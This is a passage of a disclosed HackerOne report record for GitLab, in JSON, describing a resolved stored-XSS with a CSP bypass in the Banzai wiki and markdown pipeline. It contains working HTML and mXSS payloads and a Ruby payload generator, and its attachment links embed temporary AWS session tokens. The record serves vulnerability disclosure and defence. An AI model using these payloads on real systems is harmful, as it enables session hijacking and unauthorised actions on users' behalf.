@@ -1,0 +1,175 @@
+{
+  "id": 2257080,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjU3MDgw",
+  "url": "https://hackerone.com/reports/2257080",
+  "title": "Stored-XSS injected in Wiki page via Banzai pipeline",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2023-11-19T11:54:19.194Z",
+  "submitted_at": "2023-11-19T11:54:19.399Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yvvdwf",
+    "url": "/yvvdwf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-05-28T08:11:19.325Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-05-27T18:41:29.216Z",
+  "team_member_agreed_on_going_public_at": "2024-05-28T08:11:18.981Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\n\nI found a vulnerability in [AbstractReferenceFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb) class that can be exploited to inject any HTML elements leading to stored-XSS.\n\n# Reproduce\n\n- Create a new project.\n- Got to its `Wikis`, `Create your first page` button, then fill the form:\n   + Title: `_sidear`\n   + Content: please see in `_sidebar.md` attached file ({F2868304})\n\n{F2868305}\n\n   + click `Create page` to save the wiki page\n   + after the page is reloaded, you should see an alert which is caused by `alert(document.domain)`\n   + **Note:** you will not see the alert if you are the person who can access to the Gitlab confidential issue `https://gitlab.com/gitlab-org/gitlab/-/issues/428268` which is used to track one of my H1 report. (thus, you login using another account, can create a private issue, then replace the link above by your issue's link)\n\n\n# Impact\n\nStored-XSS with CSP-bypass allows executing arbitrary javascript at the client side on behalf of victims including any RESTfull API.\n\n# TL;DR\n\n## 1. `gsub`\n \nThe vulnerable code is as the following:\n\n```ruby\n# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L116\n        def call\n          ...\n          link_pattern_start = /\\A#{link_pattern}/\n          ...\n          nodes.each_with_index do |node, index|\n            ...\n            elsif element_node?(node)\n              yield_valid_link(node) do |link, inner_html|\n                ...\n                if link == inner_html && inner_html =~ link_pattern_start\n                  replace_link_node_with_text(node, index) do\n                    object_link_filter(inner_html, link_pattern, link_reference: true)\n                  end\n\n\n# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L182\n       def object_link_filter(text, pattern, link_content: nil, link_reference: false)\n          references_in(text, pattern) do |match, id, project_ref, namespace_ref, matches|\n            ...\n            if object\n              ... \n              link = ...\n\n# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L38\n    def references_in(text, pattern = object_class.reference_pattern)\n          text.gsub(pattern) do |match|\n            if ident = identifier($~)\n              yield match, ident, $~[:project], $~[:namespace], $~\n            else\n              match\n            end\n          end\n        end\n```\n\nI'm not sure for which reason `link_pattern_start` is used to check **only** the prefix of `link_pattern` (not the whole) in the first function of the listing above. And latter the `link_pattern` is used in `gsub` to replace **any** occurrences in the third function. Consider the following HTML snippet:\n\n```html\n<a href=\"LINK_PATTERN<a alt='&quot;LINK_PATTERN'></a>\">LINK_PATTERN<a alt='\"LINK_PATTERN'></a></a>\n```\n\nThe second replacement of `LINK_PATTERN` will expanse the corresponding information into `alt` attribute. This information will never be redacted as it tag `<a>` does not have `class = gfm`. This can be used to disclose titles of private  [GitLab-specific references](https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references)\n\nFor example, open an issue with the following content (we need `<i>` tag to have  nested `<a>` tags):\n\n- input:\n```html\n<dl><a href=\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i>\">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i></a></dl>\n```\n\n- output: we can get the title of Gitlab's confidential issue 428268:\n\n\n{F2868307}\n\n\n## 2. `&quot;`\n\nNow if we replace single quot by double one, and add `href` attribute as the following:\n\n```html\n<dl><a href=\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href=&quot;//xxx&quot; alt=&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot;></a></i>\">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href=\"//xxx\" alt=\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268\"></a></i></a></dl>\n```\n\nWe get the result:\n\n{F2868306}\n\nBecause the second replacement of `LINK_PATTERN` broke down the double quotes of `alt` to introduce other attributes. The result was latter redacted by:\n\n```ruby\n# https://gitlab.com/gitlab-org/gitlab/blob/e03b60053f7f7d35c05b2732f59524a6bc6a5456/lib/banzai/reference_redactor.rb#L66\n  def redacted_node_content(node)\n      original_content = node.attr('data-original')\n      original_content = CGI.escape_html(original_content) if original_content\n\n      original_link =\n        if node.attr('data-link-reference') == 'true'\n          href = node.attr('href')\n\n          %(<a href=\"#{href}\">#{original_content}</a>)\n        end\n\n      original_link || original_content || node.inner_html\n    end\n```\n\nThis means that if we can inject `&quot;` in to the `href` attribute, then we can break it.\n\nFortunately, the [Sanitize](https://github.com/rgrove/sanitize/blob/v6.0.0/lib/sanitize/transformers/clean_element.rb#L27-L40) is here and it replaces `\"` by `%22` in the `href` attribute.\n\n```ruby\n# https://github.com/rgrove/sanitize/blob/v6.0.0/lib/sanitize/transformers/clean_element.rb#L27-L40\n\n  # Mapping of original characters to escape sequences for characters that\n  # should be escaped in attributes affected by unsafe libxml2 behavior.\n  UNSAFE_LIBXML_ESCAPE_CHARS = {\n    ' ' => '%20',\n    '\"' => '%22'\n  }\n```\n\n\nAny users' direct input of `href` is sanitized but not the `href` which are generated by other HTML filters. One of them is [GollumTagsFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/gollum_tags_filter.rb#L141). \n\nIf we provide the following input:\n\n```\n[[a|http:'\"&lt;]]\n```\n\nthen we get:\n\n```html\n<a rel=\"nofollow noreferrer noopener\" class=\"gfm\" href=\"http:'&quot;&lt;\" target=\"_blank\">a</a>\n```\n\n\nSo fare, we can introduce any attribute into `<a>` tag, or add arbitrary tag. The latter will have no attribute because no space between tag name and attribute (any space character is URI encoded when serializing `href`). \n\nFor example:\n\n- input:\n\n```html\n<dl><a href=\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268*&lt;i&gt;&lt;a href=&quot;http:&#39;&amp;quot;yvvdwf=here&amp;gt;&amp;lt;img/src=&amp;quot;0&amp;quot;onerror=&amp;quot;alert(0)&amp;quot;&amp;gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot; class=&quot;gfm&quot;&gt;a&lt;/a&gt;&lt;/i&gt;\">https://gitlab.com/gitlab-org/gitlab/-/issues/428268*<i>[[a|http:'\"yvvdwf=here&gt;&lt;img/src=\"0\"onerror=\"alert(0)\"&gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268]]</i></a></dl> \n```\n\n- output:\n\n```html\n<dl>&#x000A;<a href=\"https://gitlab.com/gitlab-org/gitlab/-/issues/428268\">https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>*<i><a href=\"http:'\" yvvdwf=\"here\"><img></a><a>https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>\" class=\"gfm\"&gt;a</i>&#x000A;</dl>\n```\n\n## 3. mXSS\n\nThe backend parses HTML by using Nokogiri with HTML4 format. HTML4 accepts only space characters between tag name and the attribute. Howeverthe browser supports HTML5 which tolerate some additional characters, such as `/`.\n\nFor example, this snippet `<img/src=\"0\"onerror=\"alert(0)\">` will give different result:\n- `<img>` at the backend {F2868308}\n- `<img src=\"0\" onerror=\"alert(0)\">` at the browser\n\nAs we can inject any tag, we use `<style>` to keep inside the snippet which will be sent to browser as-is:\n\n```html\n<style><img/src=\"0\"onerror=\"alert(0)\"></style>\n```\n\nFinally, to be able to get the `<img>` tag back, we put all of them inside `<svg>` tag:\n\n```html\n<svg><style><img/src=\"0\"onerror=\"alert(0)\"></style></svg>\n```\n\nAt the browser, the`<img>` tag  is mutated to get outside of `<svg>` context. Thus we get the following result:\n\n```html\n<svg><style></style></svg>\n<img src=\"0\" onerror=\"alert(0)\">\n```\n\nUntil here, we can inject any tag with any attribute. By using the basic payload `<i class=gl-show-field-errors><input title=\"<script>alert(document.domain)</script>\"/></i>` we can get XSS.\n\n## payload\n\nThis is a small Ruby snippet to generate the payload:\n\n```ruby\ndef gen_payload( payload, based_url: \"https://gitlab.com/gitlab-org/gitlab/-/issues/428268\")\n  payload    = \"#{payload}#{based_url}\" unless payload.include? based_url\n  payload    = payload.gsub('<', '&lt;').gsub('>', '&gt;')\n\n  es_payload = %(*<i><a href=\"http:#{ payload.gsub('\"','&quot;') }\" class=\"gfm\">a</a></i>)\n  es_payload = CGI.escape_html( es_payload ).gsub('%20', '%2520') #double encode space/tab/new_line\n\n  a = %(<dl><a href=\"#{ based_url }#{ es_payload }\">#{ based_url }*<i>[[a|http:#{ payload }]]</i></a></dl>)\n  puts a\nend\n\ngen_payload %('\"><svg><style>dl{visibility:hidden}<i/class=gl-show-field-errors><input/title=\"<script>alert(document.domain)</script>\"/></style></svg>)\n```\n\nBest regards,\nyvvdwf\n\n## Impact\n\nStored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2868304,
+      "file_name": "_sidebar.md",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/53o64trih3j2n9ef7idjll2d6q0p?response-content-disposition=attachment%3B%20filename%3D%22_sidebar.md%22%3B%20filename%2A%3DUTF-8%27%27_sidebar.md&response-content-type=text%2Fmarkdown&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYFDQO7IY%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150428Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQD9OuD2ePEEIgnHwsQC%2BdTj6of5uKbT0MhIw%2FeL0CQ9OAIhAL%2F0S34DzIRuokDr1Cp3lIRnQomOJ7NeNsLYjO8W5Ky8KroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzn%2Fwf3jc46KizF8nIqjgVkN18oXrqCmUpsTfiHBN6Zq8qBnJ%2FHXUh1Jiz18gYqHKQ%2BytXut%2FivLkXB6HyG%2BLT7cvdxT2J%2FZL%2FkOMJZTV%2BIjA3LzxQJX1U8PJ9APZpwHUddAcuek6gpwhiRm4VvHewD1zmZPY5qW3mSVO5hqB%2FOoNeUR9rmFbKB12MESLW7TsPoWfuFnwAi%2FXq%2B%2FhFamJRaluaHY9jNrey6WVh1%2B7RdgJvIbcyldkvCo0xK%2FUVs4BKpWORCV3g3FKCl2fvtjvvBzytgUrhv9wl9cm57oer6FyvFiAsaFjki8BTjx0MR1IVYIv9NSEFAYMYiysYR3VgVXXC8bljnPy3zxPdq29TBaujb1FBXA02Fda9KDjV47hcNZku6OT6KybroorlYxIJIGcgdPJ20iTxMqrrTyzDZp1I%2BSQ001Pb%2FOnI4Af3fBvCHJn%2Fs%2BGZqBhU6f2Byxnqesie1K65EZupZhKM%2FDZRRS9MtCehPHgYJbYELv7TZEyrr42%2BYahIJTXyU%2BFwGLZEqBFu3MGXnmFKFbiytZxedGzOW%2BDoApEvTFZZg4DIyw8RNsYumWXjN8MzpUM7JPbw28RcpQk3QKT9efTCDZZyh7MdZUPCxs8LNrKhUZSzauXTNWHASZPhDrd1ddf3FmLHIy3Gb0BloYcNyQzcczDgmJ3jl2jj%2F4rOfmtRj%2BrBO6n5EedMg%2BuS53msuhiZS3uokjkiHxKaPaSduAcbnmRQLvxKpTessH8dmaj5ve5452Jwu9o3xqaAw6JztbzxGuNNj%2BSU%2BwMUuClfMIw6fO6X4ZgUCsw88Fgq08zVkVSdby2Bm9rrGknPf8pG%2BUqv94ogtpnBkJUZPKTDb%2BhRgZPNLLWSkZntuFG054fhM5fswsoL9zwY6sAHMiLi%2BI5TiNiMkK5mPGuQwWpANEl30vZQrNdy2q2t7y9MPJyCegLhytHyz3vwTBjjY0uHX9pKRudyjVdSHxR%2BjLF2sxiOWXjvhDSgnRKnsQ4i2DqP7ydqJ6n8L7do0cmdkQJJKOABtVE%2F3twRnrUCq6tdQ%2BsBaTwm%2BHeoggT8j5Q4xgV%2FlCP%2Bif0xdv4M%2FZvx%2B7%2F2EbJc6JW0YE%2F1taMKbD4n646%2BF9r1hWNCcUjyKxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6d48a94c6fc8180a4afda2b3eaec487f8cbc4526145f797053db14e6161f2610",
+      "file_size": 810,
+      "type": "text/markdown",
+      "moderated": null
+    },
+    {
+      "id": 2868305,
+      "file_name": "0.sidebar.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uo5mmbrtb0tpkxwd97b4dwqig77f?response-content-disposition=attachment%3B%20filename%3D%220.sidebar.png%22%3B%20filename%2A%3DUTF-8%27%270.sidebar.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYFDQO7IY%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150428Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQD9OuD2ePEEIgnHwsQC%2BdTj6of5uKbT0MhIw%2FeL0CQ9OAIhAL%2F0S34DzIRuokDr1Cp3lIRnQomOJ7NeNsLYjO8W5Ky8KroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzn%2Fwf3jc46KizF8nIqjgVkN18oXrqCmUpsTfiHBN6Zq8qBnJ%2FHXUh1Jiz18gYqHKQ%2BytXut%2FivLkXB6HyG%2BLT7cvdxT2J%2FZL%2FkOMJZTV%2BIjA3LzxQJX1U8PJ9APZpwHUddAcuek6gpwhiRm4VvHewD1zmZPY5qW3mSVO5hqB%2FOoNeUR9rmFbKB12MESLW7TsPoWfuFnwAi%2FXq%2B%2FhFamJRaluaHY9jNrey6WVh1%2B7RdgJvIbcyldkvCo0xK%2FUVs4BKpWORCV3g3FKCl2fvtjvvBzytgUrhv9wl9cm57oer6FyvFiAsaFjki8BTjx0MR1IVYIv9NSEFAYMYiysYR3VgVXXC8bljnPy3zxPdq29TBaujb1FBXA02Fda9KDjV47hcNZku6OT6KybroorlYxIJIGcgdPJ20iTxMqrrTyzDZp1I%2BSQ001Pb%2FOnI4Af3fBvCHJn%2Fs%2BGZqBhU6f2Byxnqesie1K65EZupZhKM%2FDZRRS9MtCehPHgYJbYELv7TZEyrr42%2BYahIJTXyU%2BFwGLZEqBFu3MGXnmFKFbiytZxedGzOW%2BDoApEvTFZZg4DIyw8RNsYumWXjN8MzpUM7JPbw28RcpQk3QKT9efTCDZZyh7MdZUPCxs8LNrKhUZSzauXTNWHASZPhDrd1ddf3FmLHIy3Gb0BloYcNyQzcczDgmJ3jl2jj%2F4rOfmtRj%2BrBO6n5EedMg%2BuS53msuhiZS3uokjkiHxKaPaSduAcbnmRQLvxKpTessH8dmaj5ve5452Jwu9o3xqaAw6JztbzxGuNNj%2BSU%2BwMUuClfMIw6fO6X4ZgUCsw88Fgq08zVkVSdby2Bm9rrGknPf8pG%2BUqv94ogtpnBkJUZPKTDb%2BhRgZPNLLWSkZntuFG054fhM5fswsoL9zwY6sAHMiLi%2BI5TiNiMkK5mPGuQwWpANEl30vZQrNdy2q2t7y9MPJyCegLhytHyz3vwTBjjY0uHX9pKRudyjVdSHxR%2BjLF2sxiOWXjvhDSgnRKnsQ4i2DqP7ydqJ6n8L7do0cmdkQJJKOABtVE%2F3twRnrUCq6tdQ%2BsBaTwm%2BHeoggT8j5Q4xgV%2FlCP%2Bif0xdv4M%2FZvx%2B7%2F2EbJc6JW0YE%2F1taMKbD4n646%2BF9r1hWNCcUjyKxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=09b96b367ebfa6ef0bc64700a114d856061e59bfa313f01d3ed1329ecbb7cf0d",
+      "file_size": 292006,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 2868306,
+      "file_name": "2.breakdown.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ki50917ixmntk0q99ptmq7ax5p69?response-content-disposition=attachment%3B%20filename%3D%222.breakdown.png%22%3B%20filename%2A%3DUTF-8%27%272.breakdown.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYFDQO7IY%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150428Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQD9OuD2ePEEIgnHwsQC%2BdTj6of5uKbT0MhIw%2FeL0CQ9OAIhAL%2F0S34DzIRuokDr1Cp3lIRnQomOJ7NeNsLYjO8W5Ky8KroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzn%2Fwf3jc46KizF8nIqjgVkN18oXrqCmUpsTfiHBN6Zq8qBnJ%2FHXUh1Jiz18gYqHKQ%2BytXut%2FivLkXB6HyG%2BLT7cvdxT2J%2FZL%2FkOMJZTV%2BIjA3LzxQJX1U8PJ9APZpwHUddAcuek6gpwhiRm4VvHewD1zmZPY5qW3mSVO5hqB%2FOoNeUR9rmFbKB12MESLW7TsPoWfuFnwAi%2FXq%2B%2FhFamJRaluaHY9jNrey6WVh1%2B7RdgJvIbcyldkvCo0xK%2FUVs4BKpWORCV3g3FKCl2fvtjvvBzytgUrhv9wl9cm57oer6FyvFiAsaFjki8BTjx0MR1IVYIv9NSEFAYMYiysYR3VgVXXC8bljnPy3zxPdq29TBaujb1FBXA02Fda9KDjV47hcNZku6OT6KybroorlYxIJIGcgdPJ20iTxMqrrTyzDZp1I%2BSQ001Pb%2FOnI4Af3fBvCHJn%2Fs%2BGZqBhU6f2Byxnqesie1K65EZupZhKM%2FDZRRS9MtCehPHgYJbYELv7TZEyrr42%2BYahIJTXyU%2BFwGLZEqBFu3MGXnmFKFbiytZxedGzOW%2BDoApEvTFZZg4DIyw8RNsYumWXjN8MzpUM7JPbw28RcpQk3QKT9efTCDZZyh7MdZUPCxs8LNrKhUZSzauXTNWHASZPhDrd1ddf3FmLHIy3Gb0BloYcNyQzcczDgmJ3jl2jj%2F4rOfmtRj%2BrBO6n5EedMg%2BuS53msuhiZS3uokjkiHxKaPaSduAcbnmRQLvxKpTessH8dmaj5ve5452Jwu9o3xqaAw6JztbzxGuNNj%2BSU%2BwMUuClfMIw6fO6X4ZgUCsw88Fgq08zVkVSdby2Bm9rrGknPf8pG%2BUqv94ogtpnBkJUZPKTDb%2BhRgZPNLLWSkZntuFG054fhM5fswsoL9zwY6sAHMiLi%2BI5TiNiMkK5mPGuQwWpANEl30vZQrNdy2q2t7y9MPJyCegLhytHyz3vwTBjjY0uHX9pKRudyjVdSHxR%2BjLF2sxiOWXjvhDSgnRKnsQ4i2DqP7ydqJ6n8L7do0cmdkQJJKOABtVE%2F3twRnrUCq6tdQ%2BsBaTwm%2BHeoggT8j5Q4xgV%2FlCP%2Bif0xdv4M%2FZvx%2B7%2F2EbJc6JW0YE%2F1taMKbD4n646%2BF9r1hWNCcUjyKxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5ca3c98998bc868839673d1042c395632e77fd6ba9165a4aebdce0e87fd30094",
+      "file_size": 103106,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 2868307,
+      "file_name": "1.disclosure.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qbb8g0bqy82v5ax1wz76b6bcfmf7?response-content-disposition=attachment%3B%20filename%3D%221.disclosure.png%22%3B%20filename%2A%3DUTF-8%27%271.disclosure.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYFDQO7IY%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150428Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQD9OuD2ePEEIgnHwsQC%2BdTj6of5uKbT0MhIw%2FeL0CQ9OAIhAL%2F0S34DzIRuokDr1Cp3lIRnQomOJ7NeNsLYjO8W5Ky8KroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzn%2Fwf3jc46KizF8nIqjgVkN18oXrqCmUpsTfiHBN6Zq8qBnJ%2FHXUh1Jiz18gYqHKQ%2BytXut%2FivLkXB6HyG%2BLT7cvdxT2J%2FZL%2FkOMJZTV%2BIjA3LzxQJX1U8PJ9APZpwHUddAcuek6gpwhiRm4VvHewD1zmZPY5qW3mSVO5hqB%2FOoNeUR9rmFbKB12MESLW7TsPoWfuFnwAi%2FXq%2B%2FhFamJRaluaHY9jNrey6WVh1%2B7RdgJvIbcyldkvCo0xK%2FUVs4BKpWORCV3g3FKCl2fvtjvvBzytgUrhv9wl9cm57oer6FyvFiAsaFjki8BTjx0MR1IVYIv9NSEFAYMYiysYR3VgVXXC8bljnPy3zxPdq29TBaujb1FBXA02Fda9KDjV47hcNZku6OT6KybroorlYxIJIGcgdPJ20iTxMqrrTyzDZp1I%2BSQ001Pb%2FOnI4Af3fBvCHJn%2Fs%2BGZqBhU6f2Byxnqesie1K65EZupZhKM%2FDZRRS9MtCehPHgYJbYELv7TZEyrr42%2BYahIJTXyU%2BFwGLZEqBFu3MGXnmFKFbiytZxedGzOW%2BDoApEvTFZZg4DIyw8RNsYumWXjN8MzpUM7JPbw28RcpQk3QKT9efTCDZZyh7MdZUPCxs8LNrKhUZSzauXTNWHASZPhDrd1ddf3FmLHIy3Gb0BloYcNyQzcczDgmJ3jl2jj%2F4rOfmtRj%2BrBO6n5EedMg%2BuS53msuhiZS3uokjkiHxKaPaSduAcbnmRQLvxKpTessH8dmaj5ve5452Jwu9o3xqaAw6JztbzxGuNNj%2BSU%2BwMUuClfMIw6fO6X4ZgUCsw88Fgq08zVkVSdby2Bm9rrGknPf8pG%2BUqv94ogtpnBkJUZPKTDb%2BhRgZPNLLWSkZntuFG054fhM5fswsoL9zwY6sAHMiLi%2BI5TiNiMkK5mPGuQwWpANEl30vZQrNdy2q2t7y9MPJyCegLhytHyz3vwTBjjY0uHX9pKRudyjVdSHxR%2BjLF2sxiOWXjvhDSgnRKnsQ4i2DqP7ydqJ6n8L7do0cmdkQJJKOABtVE%2F3twRnrUCq6tdQ%2BsBaTwm%2BHeoggT8j5Q4xgV%2FlCP%2Bif0xdv4M%2FZvx%2B7%2F2EbJc6JW0YE%2F1taMKbD4n646%2BF9r1hWNCcUjyKxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8a1cbad7b41ae5028dc29e2b2fd55b19c3a2b6a6b99743f9f87d96bc3595de56",
+      "file_size": 231531,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 2868308,
+      "file_name": "nokogiri-html4.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/s383uny9u8cdrimw6ddnm0wu98vp?response-content-disposition=attachment%3B%20filename%3D%22nokogiri-html4.png%22%3B%20filename%2A%3DUTF-8%27%27nokogiri-html4.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYFDQO7IY%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150428Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQD9OuD2ePEEIgnHwsQC%2BdTj6of5uKbT0MhIw%2FeL0CQ9OAIhAL%2F0S34DzIRuokDr1Cp3lIRnQomOJ7NeNsLYjO8W5Ky8KroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzn%2Fwf3jc46KizF8nIqjgVkN18oXrqCmUpsTfiHBN6Zq8qBnJ%2FHXUh1Jiz18gYqHKQ%2BytXut%2FivLkXB6HyG%2BLT7cvdxT2J%2FZL%2FkOMJZTV%2BIjA3LzxQJX1U8PJ9APZpwHUddAcuek6gpwhiRm4VvHewD1zmZPY5qW3mSVO5hqB%2FOoNeUR9rmFbKB12MESLW7TsPoWfuFnwAi%2FXq%2B%2FhFamJRaluaHY9jNrey6WVh1%2B7RdgJvIbcyldkvCo0xK%2FUVs4BKpWORCV3g3FKCl2fvtjvvBzytgUrhv9wl9cm57oer6FyvFiAsaFjki8BTjx0MR1IVYIv9NSEFAYMYiysYR3VgVXXC8bljnPy3zxPdq29TBaujb1FBXA02Fda9KDjV47hcNZku6OT6KybroorlYxIJIGcgdPJ20iTxMqrrTyzDZp1I%2BSQ001Pb%2FOnI4Af3fBvCHJn%2Fs%2BGZqBhU6f2Byxnqesie1K65EZupZhKM%2FDZRRS9MtCehPHgYJbYELv7TZEyrr42%2BYahIJTXyU%2BFwGLZEqBFu3MGXnmFKFbiytZxedGzOW%2BDoApEvTFZZg4DIyw8RNsYumWXjN8MzpUM7JPbw28RcpQk3QKT9efTCDZZyh7MdZUPCxs8LNrKhUZSzauXTNWHASZPhDrd1ddf3FmLHIy3Gb0BloYcNyQzcczDgmJ3jl2jj%2F4rOfmtRj%2BrBO6n5EedMg%2BuS53msuhiZS3uokjkiHxKaPaSduAcbnmRQLvxKpTessH8dmaj5ve5452Jwu9o3xqaAw6JztbzxGuNNj%2BSU%2BwMUuClfMIw6fO6X4ZgUCsw88Fgq08zVkVSdby2Bm9rrGknPf8pG%2BUqv94ogtpnBkJUZPKTDb%2BhRgZPNLLWSkZntuFG054fhM5fswsoL9zwY6sAHMiLi%2BI5TiNiMkK5mPGuQwWpANEl30vZQrNdy2q2t7y9MPJyCegLhytHyz3vwTBjjY0uHX9pKRudyjVdSHxR%2BjLF2sxiOWXjvhDSgnRKnsQ4i2DqP7ydqJ6n8L7do0cmdkQJJKOABtVE%2F3twRnrUCq6tdQ%2BsBaTwm%2BHeoggT8j5Q4xgV%2FlCP%2Bif0xdv4M%2FZvx%2B7%2F2EbJc6JW0YE%2F1taMKbD4n646%2BF9r1hWNCcUjyKxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c75b5d3a123dabad098e3f5d93557eee1249e49bea116eed78137c6dc6680124",
+      "file_size": 59039,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 71,
+  "voters": [
+    "maksyche",
+    "mr-medi",
+    "anhiu102",
+    "awhacken",
+    "n1m0",
+    "zy9ard3",
+    "alejandroar",
+    "rzx007x",
+    "j0thezer0",
+    "ali",
+    "and 61 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
